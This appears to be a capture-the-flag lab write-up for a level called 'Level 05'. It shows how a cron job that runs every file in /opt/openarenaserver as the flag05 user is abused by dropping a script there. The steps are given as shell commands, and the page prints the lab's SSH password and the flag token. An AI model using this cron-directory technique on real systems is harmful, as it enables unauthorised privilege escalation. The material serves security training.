# Level 05

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level05@192.168.1.32
	Password: ne2searoevaevoem4ov4ar8ap
	You have new mail.
	```

1. Hey! We get something new here after login. Might be usefull if classic approach doesn't give anything.

	```sh
	You have new mail.
	```

1. Checking files.

	```sh
	> pwd
	/home/user/level05

	> ls -laRth
	.:
	total 12K
	dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
	-r-x------  1 level05 level05 3.5K Aug 30  2015 .bashrc
	d--x--x--x  1 root    users    340 Aug 30  2015 ..
	-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
	-r-x------  1 level05 level05  675 Apr  3  2012 .profile
	```

1. Well, the email looks like our best hint for now (before having to do a global `find`).

	```sh
	# Based on research, email location on Linux should be `/var/spool/mail`
	> ls -l /var/spool/mail/
	total 4
	-rw-r--r--+ 1 root mail 58 Aug 27 13:32 level05
	```

1. Great, we got something.

	```
	> cat /var/spool/mail/level05
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
	```

1. Ok, so we have a CRON job executing `/usr/sbin/openarenaserver` every 2 min as `flag05` user.

	```
	> cat /usr/sbin/openarenaserver
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done
	```

1. Fine, a simple Shell script. Let's analyze it.

	```sh
	#!/bin/sh

	# Loop through every file in `/opt/openarenaserver`
	for i in /opt/openarenaserver/* ;
	do
		# Set CPU time limit to 5 seconds
		# Execute file if it exists and is an executable
		(ulimit -t 5; bash -x "$i")
		# Delete the file
		rm -f "$i"
	done
	```

1. Gorgeous, we have an entry point. Let's try it!

	```sh
	> OUT=/tmp/flag05 && SCRIPT=/opt/openarenaserver/test && echo "getflag > $OUT" > $SCRIPT && chmod +x $SCRIPT
	```

1. Get the flag (after waiting ~2min for the CRON job to run).

	```sh
	> cat /tmp/flag05
	Check flag.Here is your token : viuaaale9huek52boumoomioc
	```

## Documentation

- Command: [bash](https://www.man7.org/linux/man-pages/man1/bash.1.html)
- Command: [cron](https://www.man7.org/linux/man-pages/man8/cron.8.html)
- Command: [chmod](https://man7.org/linux/man-pages/man1/chmod.1p.html)
